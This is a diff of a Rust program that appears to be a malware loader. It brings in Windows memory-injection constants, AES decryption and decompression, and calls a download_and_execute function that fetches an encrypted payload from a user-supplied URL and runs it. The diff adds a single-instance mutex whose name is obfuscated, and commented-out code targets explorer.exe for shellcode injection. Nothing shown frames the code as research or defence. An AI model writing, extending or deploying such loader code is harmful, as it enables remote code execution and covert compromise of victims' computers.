@@ -5,12 +5,14 @@ use block_modes::{BlockMode, Cbc};
 use block_modes::block_padding::NoPadding;
 use bytes::Bytes;
 use clap::Parser;
-use std::{ptr, process::exit};
+use flate2::read::{DeflateDecoder, GzDecoder};
+use named_lock::{NamedLock, Result};
+use region::{Protection, Allocation};
+use std::{ptr, process::exit, error::Error, io::self, io::Read};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};
-use flate2::read::{DeflateDecoder, GzDecoder};
-use std::io::{self, Read};
-use std::error::Error;
+
+const LOCKNAME: &str = "RLOCK";
 
 #[derive(Parser, Debug)]
 #[command(version, about, long_about = None)]
@@ -115,9 +117,6 @@ fn main() {
     // Parse args and sign values to variables
     let args = Args::parse();
 
-    println!("Hello {}!", args.url);
-    download_and_execute(args.url, args.binary, "Hello".to_string(), args.aes_key, args.aes_iv);
-
     // let process_name = "explorer.exe";
     // let pid = find_process_by_name(process_name);
     // println!("Found process: {} with PID: {}", process_name, pid);
@@ -150,5 +149,13 @@ fn main() {
     //     );
     //     kernel32::CloseHandle(handler);
     // }
-    println!("Shellcode injected successfully.")
+    let lock = match NamedLock::create(obfstr::obfstr!(LOCKNAME)) {
+        Ok(lock) => lock,
+        Err(_) => exit(0)
+    };
+    let _guard = match lock.lock() {
+        Ok(g) => g,
+        Err(_) => exit(0)
+    };
+    let _ = download_and_execute(args.url, args.binary, "Hello".to_string(), args.aes_key, args.aes_iv);
 }
